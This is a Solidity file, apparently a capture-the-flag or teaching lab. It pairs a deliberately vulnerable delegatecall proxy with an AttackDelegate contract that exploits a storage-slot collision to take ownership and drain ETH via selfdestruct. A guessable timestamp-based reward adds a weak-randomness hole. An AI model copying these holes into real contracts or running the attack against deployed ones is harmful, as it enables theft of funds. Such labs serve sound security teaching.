// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract LuckyNum {

    uint256 private _bestLucky;
    address private _user;

    function whoIam() external returns (address) {
        _user = msg.sender;
        return _user;
    }
    
    function getMyLuckyNumber() external view returns (uint256) {
        uint256 a = uint256(keccak256(abi.encode(_user))) % 1000000;
        uint256 b = uint256(keccak256(abi.encodePacked(block.timestamp))) % 1000000;
        return a + b;
    }

    function rewardLucky(uint256 _lucky) public {
        bool res = false;
        if (600000 < _lucky && _lucky < 602000) {
            _bestLucky = _lucky;
            payable(msg.sender).transfer(0.2 ether);
            res = true;
        }
        require(res == true, "Sorry, u are not best luckyer");
    }
    
    receive() external payable {}
    fallback() external payable {}

    function ownedETH() public view returns (uint256) {
        return address(this).balance;
    }
}

/// aim to fetch DelegateContol's owner
/// @dev DelegateControl can delegatecall target contract func and transfer 1 ETH
/// to target contract. 
contract DelegateControl {

    LuckyNum lucky;
    /// @notice change public => private
    address public _owner;

    modifier onlyOwner() {
        require(msg.sender == _owner, "u are not owner");
        _;
    }

    constructor(address payable _lucky) payable {
        _owner = msg.sender;
        lucky = LuckyNum(_lucky);
    }

    function recharge() public onlyOwner {
        payable(address(lucky)).transfer(1 ether);
    }

    function destructMyself() public onlyOwner {
        selfdestruct(payable(_owner));
    }

    function ownedETH() public view returns (uint256) {
        return address(this).balance;
    }

    /// @dev using low-level call to interact with these contract to delegatecall
    /// LuckyNum contract's func.
    fallback() external payable {
        (bool res, ) = address(lucky).delegatecall(msg.data);
        require(res == true, "Delegate Control failed :(");
    }
}

contract AttackDelegate {

    DelegateControl delegate;

    constructor(address payable _delegate) {
        delegate = DelegateControl(_delegate);
    }

    function changeOwner() public {
        (bool res, ) = address(delegate).call(abi.encodeWithSignature("whoIam()"));
        require(res == true, "call fallback failed");
    }

    receive() external payable {}
    fallback() external payable {}

    function earnETH() public {
        (bool res, ) = address(delegate).call(abi.encodeWithSignature("destructMyself()"));
        require(res == true, "call destructMyself failed");
    }

    function ownedETH() public view returns (uint256) {
        return address(this).balance;
    }

    function goodbye() public {
        selfdestruct(payable(msg.sender));
    }
}